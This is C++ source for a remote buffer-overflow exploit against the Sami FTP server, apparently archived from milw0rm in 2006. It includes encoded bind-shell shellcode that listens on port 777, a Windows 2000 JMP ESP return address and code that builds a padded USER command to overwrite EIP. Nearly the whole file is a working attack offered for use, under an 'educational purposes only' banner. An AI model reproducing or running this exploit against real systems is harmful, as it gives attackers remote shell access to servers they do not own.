// Two includes.
#include <fstream.h>
#include <winsock2.h>
// Project - Settings - Link > Object/Library modules \'Ws2_32.lib\' 
#pragma comment(lib, \"ws2_32\")

char MyShellCode[] =       // XOR by \\x99\\x99\\x99\\x99.
\"\\xD9\\xEE\\xD9\\x74\\x24\\xF4\\x5B\\x31\\xC9\\xB1\\x59\\x81\\x73\\x17\\x99\\x99\"
\"\\x99\\x99\\x83\\xEB\\xFC\\xE2\" // Bind ShellCode port 777.
                        \"\\xF4\\x71\\xA1\\x99\\x99\\x99\\xDA\\xD4\\xDD\\x99\"
\"\\x7E\\xE0\\x5F\\xE0\\x7C\\xD0\\x1F\\xD0\\x3D\\x34\\xB7\\x70\\x3D\\x83\\xE9\\x5E\"
\"\\x40\\x90\\x6C\\x34\\x52\\x74\\x65\\xA2\\x17\\xD7\\x97\\x75\\xE7\\x41\\x7B\\xEA\"
\"\\x34\\x40\\x9C\\x57\\xEB\\x67\\x2A\\x8F\\xCE\\xCA\\xAB\\xC6\\xAA\\xAB\\xB7\\xDD\"
\"\\xD5\\xD5\\x99\\x98\\xC2\\xCD\\x10\\x7C\\x10\\xC4\\x99\\xF3\\xA9\\xC0\\xFD\\x12\"
\"\\x98\\x12\\xD9\\x95\\x12\\xE9\\x85\\x34\\x12\\xC1\\x91\\x72\\x95\\x14\\xCE\\xB5\"
\"\\xC8\\xCB\\x66\\x49\\x10\\x5A\\xC0\\x72\\x89\\xF3\\x91\\xC7\\x98\\x77\\xF3\\x93\"
\"\\xC0\\x12\\xE4\\x99\\x19\\x60\\x9F\\xED\\x7D\\xC8\\xCA\\x66\\xAD\\x16\\x71\\x09\"
\"\\x99\\x99\\x99\\xC0\\x10\\x9D\\x17\\x7B\\x72\\xA8\\x66\\xFF\\x18\\x75\\x09\\x98\"
\"\\xCD\\xF1\\x98\\x98\\x99\\x99\\x66\\xCC\\xB9\\xCE\\xCE\\xCE\\xCE\\xDE\\xCE\\xDE\"
\"\\xCE\\x66\\xCC\\x85\\x10\\x5A\\xA8\\x66\\xCE\\xCE\\xF1\\x9B\\x99\\x9A\\x90\\x10\"
\"\\x7F\\xF3\\x89\\xCF\\xCA\\x66\\xCC\\x81\\xCE\\xCA\\x66\\xCC\\x8D\\xCE\\xCF\\xCA\"
\"\\x66\\xCC\\x89\\x10\\x5B\\xFF\\x18\\x75\\xCD\\x99\\x14\\xA5\\xBD\\xA8\\x59\\xF3\"
\"\\x8C\\xC0\\x6A\\x32\\x10\\x4E\\x5F\\xDD\\xBD\\x89\\xDD\\x67\\xDD\\xBD\\xA4\\x10\"
\"\\xE5\\xBD\\xD1\\x10\\xE5\\xBD\\xD5\\x10\\xE5\\xBD\\xC9\\x14\\xDD\\xBD\\x89\\xCD\"
\"\\xC9\\xC8\\xC8\\xC8\\xD8\\xC8\\xD0\\xC8\\xC8\\x66\\xEC\\x99\\xC8\\x66\\xCC\\xA9\"
\"\\x10\\x78\\xF1\\x66\\x66\\x66\\x66\\x66\\xA8\\x66\\xCC\\xB5\\xCE\\x66\\xCC\\x95\"
\"\\x66\\xCC\\xB1\\xCA\\xCC\\xCF\\xCE\\x12\\xF5\\xBD\\x81\\x12\\xDC\\xA5\\x12\\xCD\"
\"\\x9C\\xE1\\x98\\x73\\x12\\xD3\\x81\\x12\\xC3\\xB9\\x98\\x72\\x7A\\xAB\\xD0\\x12\"
\"\\xAD\\x12\\x98\\x77\\xA8\\x66\\x65\\xA8\\x59\\x35\\xA1\\x79\\xED\\x9E\\x58\\x56\"
\"\\x94\\x98\\x5E\\x72\\x6B\\xA2\\xE5\\xBD\\x8D\\xEC\\x78\\x12\\xC3\\xBD\\x98\\x72\"
\"\\xFF\\x12\\x95\\xD2\\x12\\xC3\\x85\\x98\\x72\\x12\\x9D\\x12\\x98\\x71\\x72\\x9B\"
\"\\xA8\\x59\\x10\\x73\\xC6\\xC7\\xC4\\xC2\\x5B\\x91\\x99\";

static char PayLoad[1329];  

int IP;                     
int Port;                   
int szNOP1, szNOP2;         
int Nop; 

// Jump ESP by library User32 on Win2000 SP4 fr..
char JmpESP[] = \"\\x0C\\xED\\xE3\\x77\";
// Flag ID server Sami FTP.
char TargetFlag[] = \"220-\\r\\n220 Features p a .\";
char RecvBuff[200];

void usage(){
  cout<<\" \"<<endl;
  cout<<\"USAGE : ThisAppz [Target IP] [Port to connect FTP]\"  <<endl;
  cout<<\"If a port isnt specified, default port will 21.\"    <<endl;
  cout<<\"Without IP, the Xploit run in local mode [127.0.0.1]\"<<endl;
  cout<<\" \"<<endl;
  return;}

void Info(){
  cout<<\" \"<<endl;
  cout<<\" ============================================== v1.0 ==\"<<endl;
  cout<<\" ====== Sami FTP Remote Buffer Overflow Exploit  ======\"<<endl;
  cout<<\" ================== Coded by HolyGhost ================\"<<endl;
  cout<<\" ====== Distributed for educational purposes only =====\"<<endl;
  cout<<\" ================== StormyTeam@free.fr ================\"<<endl;
  cout<<\" ======================================================\"<<endl;
  cout<<\" \"<<endl;}

int main(int argc,char *argv[]){

Info();
if ( ( argc > 3 ) ){usage();return -1;} 

if( argc > 1 ){ 
  cout<<\"argv[1]\"<<\"\\t\"<<argv[1]<<endl;
  IP = htonl( inet_addr( argv[1] ) );}
else{ 
  cout<<\"Local test mode : 127.0.0.1\"<<endl;
  IP = htonl( inet_addr( \"127.0.0.1\" ) );}

if( argc == 3 ){
  cout<<\"argv[2]\"<<\"\\t\"<<argv[2]<<endl;
  Port = atoi( argv[2] );}
else{
  cout<<\"Port by default : 21\"<<endl;
  Port = 21;}

WSADATA wsadata;

if( WSAStartup( MAKEWORD( 2, 0 ),&wsadata )!=0 ){
  cout<<\"[-] WSAStartup error. Bye!\"<<endl;
  return -1;}

SOCKET sck;
fd_set mask;              
struct timeval timeout;
struct sockaddr_in server;

sck = socket( AF_INET, SOCK_STREAM, 0 ); // TCP.

if( sck == -1 ){cout<<\"[-] Socket() error. Bye!\"<<endl; return -1;}
 
server.sin_family = AF_INET; // Address Internet 4 bytes.
server.sin_addr.s_addr = htonl( IP );
server.sin_port = htons( Port ); // Definition port.
// Try to connect on FTP server.
connect( sck,( struct sockaddr *)&server, sizeof( server ) );

timeout.tv_sec = 3; // Delay 3 seconds.
timeout.tv_usec = 0;
FD_ZERO( &mask );
FD_SET( sck, &mask );

switch( select( sck + 1, NULL, &mask, NULL, &timeout ) ){
  case -1:{ // Problem! 
    cout<<\"[-] Select() error. Bye!\"<<endl;
    closesocket( sck );
	return -1;}

  case 0:{ // Problem!
	cout<<\"[-] Connect() error. Bye!\"<<endl;
	closesocket( sck );
	return -1;}

  default: 
  if(FD_ISSET( sck, &mask ) ){
    recv( sck, RecvBuff, 256, 0 ); // Reception Flag ID.

    cout<<\"[+] Connected, checking the server for flag...\"<<endl;
	Sleep( 500 );
	
    if ( !strstr( RecvBuff, TargetFlag ) ){
      cout<<\"[-] This is not a valid flag from target! Bye.\"<<endl;
	  return -1;} // Bye!
	cout<<RecvBuff;

    Sleep( 1000 ); 
    cout<<\"[+] Connected, constructing the PayLoad...\"<<endl;
   
    szNOP1 = 219; // First padding.
	szNOP2 = 720; // Second padding. 
    // Initialise le Buffer PayLoad NULL.
    memset( PayLoad, NULL, sizeof( PayLoad ) );
    strcat( PayLoad, \"USER \" );     // Command User.
    // First padding.
    for( Nop = 0; Nop < szNOP1; Nop++ ){
	  strcat( PayLoad, \"\\x90\" );}
    // New EIP register.
	strcat( PayLoad, JmpESP );
    // Second Padding.
    for( Nop = 0; Nop < szNOP2; Nop++ ){
	  strcat( PayLoad, \"\\x90\" );}
    strcat( PayLoad, MyShellCode );
    strcat( PayLoad, \"\\x0D\\x0A\" );
    // Send fully PayLoad.
    if( send( sck, PayLoad, strlen( PayLoad ), 0 ) == SOCKET_ERROR ){
	  cout<<\"[-] Sending error, the server prolly rebooted.\"<<endl;
	  return -1;}

    Sleep( 1000 ); 

    cout<<\"[+] Nice!!! See your log for execute an evil command.\"<<endl;
    cout<<\"[+] After, try to connect on FTP server by port 777.\"<<endl;
    return 0;
  }
}

closesocket( sck );
WSACleanup();
return 0; // Bye!

}
// Fully PayLoad description (1329 Bytes) -
// [USER ] [padding NOP1] [rEIP] [padding NOP2] [ShellCode] [\\r\\n]
// 5        219             4      720             379         2

// milw0rm.com [2006-01-31]
